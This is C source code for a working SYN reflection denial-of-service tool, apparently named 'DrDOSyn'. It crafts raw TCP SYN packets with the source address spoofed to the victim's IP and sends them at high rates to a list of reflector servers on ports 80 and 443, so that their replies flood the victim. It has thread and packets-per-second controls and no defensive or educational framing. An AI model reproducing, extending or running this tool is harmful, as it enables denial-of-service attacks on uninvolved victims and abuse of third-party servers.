#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
unsigned long targetAddress;

struct list
{
	struct sockaddr_in data;
	struct list *next;
	struct list *prev;
};

struct tcpOptions {
        uint8_t msskind;
        uint8_t msslen;
        uint16_t mssvalue;
        uint8_t nop_nouse;
        uint8_t wskind;
        uint8_t wslen;
        uint8_t wsshiftcount;
        uint8_t nop_nouse2;
        uint8_t nop_nouse3;
        uint8_t sackkind;
        uint8_t sacklen;
        uint8_t tstamp;
        uint8_t tslen;
        uint8_t tsno;
        uint8_t tsval;
        uint8_t tsclock;
        uint8_t tsclockval;
        uint8_t tssendval;
        uint8_t tsecho;
        uint8_t tsecho2;
        uint8_t tsecho3;
        uint8_t tsecho4;
};

struct list *head;

struct thread_data
{
	int thread_id;
	struct list *list_node;
	struct sockaddr_in sin;
};

void init_rand(unsigned long int x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;

	for (i = 3; i < 4096; i++)
		Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

unsigned long int rand_cmwc(void)
{
	unsigned long long int t, a = 18782LL;
	static unsigned long int i = 4095;
	unsigned long int x, r = 0xfffffffe;

	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;

	if (x < c)
	{
		x++;
		c++;
	}
	return (Q[i] = r - x);
}

int randnum(int min_num, int max_num)
{
	int result = 0, low_num = 0, hi_num = 0;

	if (min_num < max_num)
	{
		low_num = min_num;
		hi_num = max_num + 1;
	}

	else
	{
		low_num = max_num + 1;
		hi_num = min_num;
	}

	result = (rand_cmwc() % (hi_num - low_num)) + low_num;
	return result;
}

unsigned short csum(unsigned short *buf, int count)
{
	register unsigned long sum = 0;
	while (count > 1)
	{
		sum += *buf++;
		count -= 2;
	}

	if (count > 0)
		sum += *(unsigned char *)buf;

	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);

	return (unsigned short)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph, int optionLen)
{

	struct tcp_pseudo
	{
		unsigned long src_addr;
		unsigned long dst_addr;
		unsigned char zero;
		unsigned char proto;
		unsigned short length;
	} pseudohead;

	pseudohead.src_addr = iph->saddr;
	pseudohead.dst_addr = iph->daddr;
	pseudohead.zero = 0;
	pseudohead.proto = 6;
	pseudohead.length = htons(sizeof(struct tcphdr));
	int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + optionLen;
	unsigned short *tcp = malloc(totaltcp_len);
	memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
	memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr) + optionLen); 
	unsigned short output = csum(tcp, totaltcp_len);
	free(tcp);
	return output;
}

void setup_ip_header(struct iphdr *iph)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
	iph->id = htonl(rand_cmwc() & 0xFFFF);
	iph->frag_off = 0;
	iph->ttl = randnum(64, 255);
	iph->protocol = 6;
	iph->check = 0;
	iph->saddr = inet_addr("0.0.0.0");
}

int ports[] = {80, 443};
int windows[] = {8192, 65535, 14600, 64240};

void setup_tcp_header(struct tcphdr *tcph)
{
	tcph->dest = htons(ports[rand_cmwc() % 2]);
	tcph->source = htons(floodport);

	tcph->ack = 0;
	tcph->ack_seq = randnum(10000, 99999);
	tcph->psh = 0;
	tcph->fin = 0;
	tcph->rst = 0;
	tcph->res2 = randnum(0,1);
	tcph->doff = (sizeof(struct tcphdr) + sizeof(struct tcpOptions)) / 4;
	tcph->syn = 1;
	tcph->urg = 0;
	tcph->urg_ptr = 0;
	tcph->window = htons(windows[rand_cmwc() % 4]);
	tcph->check = 0;
}

void setup_tcpopts_header(struct tcpOptions *opts)
{
    opts->nop_nouse = 0x01;
    opts->nop_nouse2 = 0x01;
    opts->nop_nouse3 = 0x01;
    opts->msskind = 0x02;
    opts->mssvalue = htons(1460);
    opts->msslen = 0x04;
    opts->wskind = 0x03;
    opts->wslen = 0x03;
    opts->wsshiftcount = 0x07;
    opts->sackkind = 0x04;
    opts->sacklen = 0x02;
    opts->tstamp = 0x08;
    opts->tslen = 0x0a;
    opts->tsno = randnum(1, 250);
    opts->tsval = 0xd8;
    opts->tsclock = 0xd9;
    opts->tsclockval = 0x68;
    opts->tssendval = 0xa3;
    opts->tsecho = 0x00;
    opts ->tsecho2 = 0x00;
    opts->tsecho3 = 0x00;
    opts->tsecho4 = 0x00;
}

void *flood(void *par1)
{
	struct thread_data *td = (struct thread_data *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
	struct tcpOptions *opts = (void *)iph + sizeof(struct iphdr) + sizeof(struct tcphdr);
	struct sockaddr_in sin = td->sin;
	struct list *list_node = td->list_node;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(floodport);

	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);

	if (s < 0)
	{
		fprintf(stderr, "Could not open raw socket.\n");
		exit(-1);
	}

	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);
	setup_tcp_header(tcph);
	setup_tcpopts_header(opts);
	iph->saddr = sin.sin_addr.s_addr;
	iph->daddr = list_node->data.sin_addr.s_addr;
	iph->check = csum((unsigned short *)datagram, iph->tot_len);

	int tmp = 1;
	const int *val = &tmp;

	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
	{
		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
		exit(-1);
	}

	init_rand(time(NULL));
	register unsigned int i;
	i = 0;

	while (1)
	{
		tcph->check = 0;
		tcph->doff = ((sizeof (struct tcphdr)) + sizeof(struct tcpOptions)) / 4;
		tcph->dest = htons(ports[rand_cmwc() % 2]);
		list_node = list_node->next;
		iph->saddr = sin.sin_addr.s_addr;
		iph->daddr = list_node->data.sin_addr.s_addr;
		iph->id = htonl(rand_cmwc() & 0xFFFF);
		tcph->ack_seq = randnum(10000, 99999);
		tcph->window = htons(windows[rand_cmwc() % 4]);
		iph->ttl = randnum(64, 255);
		iph->check = csum((unsigned short *)datagram, iph->tot_len);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
		if (floodport == 0) 
			tcph->source = htons(rand_cmwc() % 0xFFFF);

		tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
		pps++;

		if (i >= limiter)
		{
			i = 0;
			usleep(sleeptime);
		}
		i++;
	}
}

int main(int argc, char *argv[])
{
	if (argc < 7)
	{
		fprintf(stdout, "DrDOSyn @cxmmand - netty\n");
		fprintf(stdout, "Usage: %s [Target] [Port] [Threads] [PPS] [Time] [List]\n", argv[0]);
		exit(-1);
	}

	fprintf(stdout, "Preparing...\n");
	int max_len = 128;
	int i = 0;
	char *buffer = (char *)malloc(max_len);
	head = NULL;
	buffer = memset(buffer, 0x00, max_len);
	int num_threads = atoi(argv[3]);
	floodport = atoi(argv[2]);
	int maxpps = atoi(argv[4]);
	limiter = 0;
	pps = 0;

	FILE *list_fd = fopen(argv[6], "r");
	while (fgets(buffer, max_len, list_fd) != NULL)
	{
		if ((buffer[strlen(buffer) - 1] == '\n') || (buffer[strlen(buffer) - 1] == '\r'))
		{
			buffer[strlen(buffer) - 1] = 0x00;
			if (head == NULL)
			{
				head = (struct list *)malloc(sizeof(struct list));
				bzero(&head->data, sizeof(head->data));
				head->data.sin_addr.s_addr = inet_addr(buffer);
				head->next = head;
				head->prev = head;
			}
			else
			{
				struct list *new_node = (struct list *)malloc(sizeof(struct list));
				memset(new_node, 0x00, sizeof(struct list));
				new_node->data.sin_addr.s_addr = inet_addr(buffer);
				new_node->prev = head;
				new_node->next = head->next;
				head->next = new_node;
			}
			i++;
		}
		else
			continue;
	}
	struct list *current = head->next;

	pthread_t thread[num_threads];
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = inet_addr(argv[1]);
	int multiplier = 20;
	struct thread_data td[num_threads];

	for (i = 0; i < num_threads; i++)
	{
		td[i].thread_id = i;
		td[i].sin = sin;
		td[i].list_node = current;
		pthread_create(&thread[i], NULL, &flood, (void *)&td[i]);
	}

	for (i = 0; i < (atoi(argv[5]) * multiplier); i++)
	{
		usleep((1000 / multiplier) * 1000);
		if ((pps * multiplier) > maxpps)
		{
			if (1 > limiter)
				sleeptime += 100;

			else
				limiter--;
		}
		else
		{
			limiter++;
			if (sleeptime > 25)
				sleeptime -= 25;

			else
				sleeptime = 0;
		}
		pps = 0;
	}
	return 0;
}